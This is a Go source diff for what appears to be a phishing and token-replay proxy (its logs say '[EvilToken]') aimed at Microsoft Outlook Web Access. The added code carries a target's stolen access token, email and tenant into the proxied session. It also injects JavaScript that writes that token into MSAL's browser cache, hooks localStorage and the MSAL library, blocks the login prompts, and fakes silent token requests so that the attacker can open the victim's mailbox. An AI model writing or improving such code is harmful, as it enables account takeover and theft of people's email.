@@ -572,6 +572,11 @@ type owaSession struct {
 	at     string
 	client *http.Client
 	mu     sync.Mutex
+	// MSAL cache injection — used to pre-populate the proxy origin's localStorage
+	// so MSAL finds valid tokens and never triggers loginRedirect.
+	msalAT     string // access token to inject
+	msalEmail  string // user email (preferred_username claim)
+	msalTenant string // tenant GUID
 }
 
 var (
@@ -614,6 +619,14 @@ func owaRewrite(body []byte, sessID string, ct string) []byte {
 	s = strings.ReplaceAll(s, `//outlook.office.com`, base)
 	s = strings.ReplaceAll(s, `//outlook.office365.com`, base)
 	s = strings.ReplaceAll(s, `//outlook.cloud.microsoft`, base)
+
+	// Restore OAuth scope URIs that were corrupted by the above replacements.
+	// MSAL config embeds scope strings like "https://outlook.office.com/.default"
+	// which must remain pointing at Microsoft — NOT our proxy.
+	s = strings.ReplaceAll(s, base+"/.default", "https://outlook.office.com/.default")
+	escapedBase := strings.ReplaceAll(base, "/", `\/`)
+	s = strings.ReplaceAll(s, escapedBase+`\/.default`, `https:\/\/outlook.office.com\/.default`)
+
 	return []byte(s)
 }
 
@@ -646,7 +659,15 @@ func (s *HttpServer) handleDCOpen(w http.ResponseWriter, r *http.Request) {
 	}
 
 	jar, _ := cookiejar.New(nil)
-	sess := &owaSession{at: owaAT}
+	tgt.mu.Lock()
+	tgtEmail := tgt.Email
+	tgt.mu.Unlock()
+	sess := &owaSession{
+		at:         owaAT,
+		msalAT:     owaAT,
+		msalEmail:  tgtEmail,
+		msalTenant: tenant,
+	}
 	sess.client = &http.Client{
 		Jar:     jar,
 		Timeout: 30 * time.Second,
@@ -862,6 +883,62 @@ if(!window.crypto||!window.crypto.subtle){
     }
   }catch(e){}
 }());
+/* ── MSAL token cache pre-injection ──────────────────────────────────────────
+   Populate localStorage with real token entries (server refreshed) so MSAL
+   never triggers loginRedirect at the proxy origin.
+   ──────────────────────────────────────────────────────────────────────────── */
+(function(){
+  var _AT=%q;
+  var _email=%q;
+  var _tenant=%q;
+  if(!_AT)return;
+  function _jc(t){try{var p=t.split('.');if(p.length<2)return{};var b=p[1].replace(/-/g,'+').replace(/_/g,'/');while(b.length%%4)b+='=';return JSON.parse(atob(b))||{};}catch(e){return{};}}
+  var cl=_jc(_AT);
+  var oid=cl.oid||cl.sub||'uid';
+  var tid=cl.tid||_tenant||'common';
+  var upn=cl.preferred_username||cl.upn||_email||'';
+  var nm=cl.name||upn;
+  var exp=cl.exp||Math.floor(Date.now()/1000)+3600;
+  var now=Math.floor(Date.now()/1000);
+  var haid=oid+'.'+tid;
+  var env='login.microsoftonline.com';
+  var acctKey=haid+'-'+env+'-'+tid;
+  var sc='https://outlook.office.com/.default';
+  // Inject account entry (safe: nuclear wipe already ran above)
+  try{localStorage.setItem('msal.account.keys',JSON.stringify([acctKey]));}catch(e){}
+  try{localStorage.setItem(acctKey,JSON.stringify({homeAccountId:haid,environment:env,tenantId:tid,username:upn,localAccountId:oid,name:nm,authorityType:'MSSTS',clientInfo:btoa(JSON.stringify({uid:oid,utid:tid})).replace(/=/g,'')}));}catch(e){}
+  // Intercept setItem: learn MSAL clientId the moment it writes token.keys.*
+  var _si=Storage.prototype.setItem;
+  Storage.prototype.setItem=function(k,v){
+    _si.call(this,k,v);
+    if(typeof k==='string'&&k.startsWith('msal.token.keys.')){
+      var cid=k.slice(16);if(!cid)return;
+      var atk=haid+'-'+env+'-accesstoken-'+cid+'-'+tid+'-'+sc;
+      try{_si.call(this,atk,JSON.stringify({homeAccountId:haid,environment:env,clientId:cid,credentialType:'AccessToken',secret:_AT,cachedAt:String(now),expiresOn:String(exp),extendedExpiresOn:String(exp+3600),target:sc,tokenType:'Bearer',realm:tid}));}catch(e){}
+      // Patch the token.keys index to include our AT key
+      try{var kv=JSON.parse(v)||{};if(!Array.isArray(kv.accessToken))kv.accessToken=[];if(kv.accessToken.indexOf(atk)===-1)kv.accessToken.push(atk);if(!Array.isArray(kv.idToken))kv.idToken=[];if(!Array.isArray(kv.refreshToken))kv.refreshToken=[];_si.call(this,k,JSON.stringify(kv));}catch(e){}
+    }
+  };
+  // Intercept window.msal global to patch PublicClientApplication prototype
+  try{Object.defineProperty(window,'msal',{
+    set:function(v){
+      if(v&&v.PublicClientApplication){
+        var _p=v.PublicClientApplication.prototype;
+        _p.loginRedirect=function(){console.warn('[xt] loginRedirect blocked');return Promise.resolve(null);};
+        _p.loginPopup=function(){return Promise.reject(new Error('blocked'));};
+        var _ats=_p.acquireTokenSilent;
+        _p.acquireTokenSilent=function(req){
+          var self=this;
+          if(_ats){return _ats.call(self,req).catch(function(){return Promise.resolve({accessToken:_AT,tokenType:'Bearer',scopes:req&&req.scopes?req.scopes:[sc],account:self.getAllAccounts&&self.getAllAccounts()[0]||null,fromCache:true,expiresOn:new Date(exp*1000)});});}
+          return Promise.resolve({accessToken:_AT,tokenType:'Bearer',scopes:req&&req.scopes?req.scopes:[sc],account:null,fromCache:true,expiresOn:new Date(exp*1000)});
+        };
+      }
+      window.__msal__=v;
+    },
+    get:function(){return window.__msal__;},
+    configurable:true
+  });}catch(e){}
+}());
 /* ── Storage.prototype.getItem guard: ensure ALL msal.*.keys reads return arrays ──
    Covers both msal.token.keys.* AND msal.account.keys* ── */
 (function(){
@@ -922,9 +999,9 @@ var _fix=function(u){
 var _fetch=window.fetch;
 window.fetch=function(u,o){return _fetch(_fix(u),o);};
 var _xo=XMLHttpRequest.prototype.open;
-XMLHttpRequest.prototype.open=function(m,u){return _xo.apply(this,[m,(typeof u==='string'&&_hosts.test(u))?_base+'/__x__/'+encodeURIComponent(u):u].concat(Array.prototype.slice.call(arguments,2)));};;
+XMLHttpRequest.prototype.open=function(m,u){return _xo.apply(this,[m,(typeof u==='string'&&_hosts.test(u))?_base+'/__x__/'+encodeURIComponent(u):u].concat(Array.prototype.slice.call(arguments,2)));};
 })();
-</script>`, proxyBase)
+</script>`, sess.msalAT, sess.msalEmail, sess.msalTenant, proxyBase)
 		// Case-insensitive head injection — OWA HTML may use uppercase <HEAD>
 		lower := strings.ToLower(string(rawBody))
 		if idx := strings.Index(lower, "<head"); idx >= 0 {
@@ -1540,8 +1617,9 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
 	// Patch localStorage.getItem so msal.token.keys.* always returns valid arrays.
 	// Stale entries written by older broken injects had null arrays; MSAL's
 	// migrateIdTokens calls .find() on idToken and crashes on null.
-	js.WriteString("  /* 0a. Guard msal.token.keys.* against null arrays */\n")
-	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());\n")
+	js.WriteString("  /* 0a. Guard msal.token.keys.* + msal.account.keys against null/non-array */\n")
+	// Guard covers: token.keys.* (ensure arrays never null), account.keys (ensure array)
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0){if(!v)return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});}}if(k==='msal.account.keys'){if(!v)return v;try{var p=JSON.parse(v);if(!Array.isArray(p))return JSON.stringify([]);}catch(e){return JSON.stringify([]);}}return v;};}());\n")
 	// Block MSAL's hidden-iframe ssoSilent: intercept iframe.src writes that contain
 	// prompt=none and immediately fire a load event so MSAL's silent request resolves
 	// (with failure) and falls back to the cache rather than doing loginRedirect.
@@ -1563,8 +1641,14 @@ func (s *HttpServer) handleDCInject(w http.ResponseWriter, r *http.Request) {
     try{localStorage.setItem(k,v);}catch(e){}
     try{sessionStorage.setItem(k,v);}catch(e){}
   });
-  console.log('%c✓ OWA tokens written — navigating to /mail/','color:#0a0;font-size:14px;font-weight:bold');
-  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},300);
+  console.log('%c✓ OWA tokens written — loading /mail/ (guards active)...','color:#0a0;font-size:14px;font-weight:bold');
+  /* Navigate via document.write so Storage.prototype guards survive into OWA */
+  setTimeout(function(){
+    fetch('/mail/',{credentials:'include',headers:{'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cache-Control':'no-cache'}})
+      .then(function(r){return r.text();})
+      .then(function(h){history.replaceState(null,'','/mail/');document.open('text/html','replace');document.write(h);document.close();})
+      .catch(function(){location.href='/mail/';});
+  },300);
 })();`)
 
 	snippet := js.String()
@@ -1971,8 +2055,9 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	entriesJSON, _ := json.Marshal(entries)
 	var js strings.Builder
 	js.WriteString("(function(){\n")
-	// Guard msal.token.keys.* against null arrays from any prior broken inject.
-	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0&&v){try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){}}return v;};}());\n")
+	// Guard msal.token.keys.* AND msal.account.keys against null/non-array values.
+	// This guard MUST survive the navigation — we use document.write() for that reason.
+	js.WriteString("  (function(){var _gi=Storage.prototype.getItem;Storage.prototype.getItem=function(k){var v=_gi.call(this,k);if(k&&k.indexOf('msal.token.keys.')===0){if(!v)return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});try{var p=JSON.parse(v);if(p&&typeof p==='object'){if(!Array.isArray(p.idToken))p.idToken=[];if(!Array.isArray(p.accessToken))p.accessToken=[];if(!Array.isArray(p.refreshToken))p.refreshToken=[];return JSON.stringify(p);}}catch(e){return JSON.stringify({accessToken:[],idToken:[],refreshToken:[]});}}if(k==='msal.account.keys'){if(!v)return v;try{var p=JSON.parse(v);if(!Array.isArray(p))return JSON.stringify([]);}catch(e){return JSON.stringify([]);}}return v;};}());\n")
 	js.WriteString("  (function(){var _ce=document.createElement;document.createElement=function(t){var el=_ce.call(document,t);if((t+'').toLowerCase()==='iframe'){var _sa=el.setAttribute.bind(el);el.setAttribute=function(n,v){if(n==='src'&&v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}_sa(n,v);};Object.defineProperty(el,'src',{set:function(v){if(v&&String(v).indexOf('prompt=none')!==-1){setTimeout(function(){try{el.dispatchEvent(new Event('load'));}catch(e){}},20);return;}el.setAttribute('src',v);},get:function(){return el.getAttribute('src')||'';},configurable:true});}return el;};}());\n")
 	js.WriteString("  var d=")
 	js.WriteString(string(entriesJSON))
@@ -1980,8 +2065,14 @@ func buildOWAInjectSnippet(at, rt, idt, tenant, email string) string {
 	js.WriteString("  /* Wipe stale MSAL entries from BOTH localStorage AND sessionStorage */\n")
 	js.WriteString("  try{['localStorage','sessionStorage'].forEach(function(s){try{var st=window[s];Object.keys(st).filter(function(k){return k.startsWith('msal.');}).forEach(function(k){st.removeItem(k);});}catch(e){}});}catch(e){}\n")
 	js.WriteString("  Object.keys(d).forEach(function(k){\n    var v=typeof d[k]==='string'?d[k]:JSON.stringify(d[k]);\n    try{localStorage.setItem(k,v);}catch(e){}\n    try{sessionStorage.setItem(k,v);}catch(e){}\n  });\n")
-	js.WriteString("  console.log('%c[EvilToken] ✓ MSAL cache written — navigating to OWA...','color:#0a0;font-size:14px;font-weight:bold');\n")
-	js.WriteString("  setTimeout(function(){location.href='https://outlook.cloud.microsoft/mail/';},400);\n")
+	js.WriteString("  console.log('%c[EvilToken] ✓ MSAL cache written — loading OWA (guards active)...','color:#0a0;font-size:14px;font-weight:bold');\n")
+	// Use document.write() so Storage.prototype guards persist into the loaded OWA page
+	js.WriteString("  setTimeout(function(){\n")
+	js.WriteString("    fetch('/mail/',{credentials:'include',headers:{'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Cache-Control':'no-cache'}})\n")
+	js.WriteString("      .then(function(r){return r.text();})\n")
+	js.WriteString("      .then(function(h){history.replaceState(null,'','/mail/');document.open('text/html','replace');document.write(h);document.close();})\n")
+	js.WriteString("      .catch(function(){location.href='/mail/';});\n")
+	js.WriteString("  },400);\n")
 	js.WriteString("})();")
 	return js.String()
 }
